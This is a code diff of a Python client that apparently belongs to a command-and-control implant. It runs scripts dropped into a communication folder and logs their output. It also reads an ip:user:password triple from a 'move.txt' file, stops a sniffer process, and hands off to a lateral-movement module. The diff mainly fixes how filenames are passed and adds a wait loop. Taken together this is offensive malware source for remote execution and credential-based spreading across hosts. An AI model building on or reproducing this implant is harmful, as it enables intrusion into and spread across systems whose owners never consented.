@@ -30,7 +30,7 @@ def comm():
 def script(filename):
     os.chdir('./communication/ClientSide/script')
     with open(filename.split('.')[0] + 'Output.txt', 'w') as f:
-        subprocess.call(['python', filename[0]], stdout=f)
+        subprocess.call(['python', filename], stdout=f)
         f.close()
     os.remove('./' + filename)
     for f in os.listdir('./'):
@@ -74,11 +74,12 @@ def main():
         if (filename and not run.is_alive()):
             print('new process')
             print(filename)
-            if (filename[0] == 'move.txt'):
-                with open('./communication/ClientSide/script/' + filename[0], 'r') as f:
+            filename = filename[0]
+            if (filename == 'move.txt'):
+                with open('./communication/ClientSide/script/' + filename, 'r') as f:
                     ip, user, password = f.read().split(':')
                     f.close()
-                os.remove('./communication/ClientSide/script/' + filename[0])
+                os.remove('./communication/ClientSide/script/' + filename)
                 if ip:
                     os.chdir('./LateralMovement')
                     sniffer.terminate()
@@ -89,7 +90,9 @@ def main():
                     else:
                         print(result)
             else:
-                run = multiprocessing.Process(target=script, args=(filename[0],))
+                while(commu.is_alive()):
+                    pass
+                run = multiprocessing.Process(target=script, args=(filename,))
                 run.start()
 
         if (not commu.is_alive() and time.time() - t > 5):
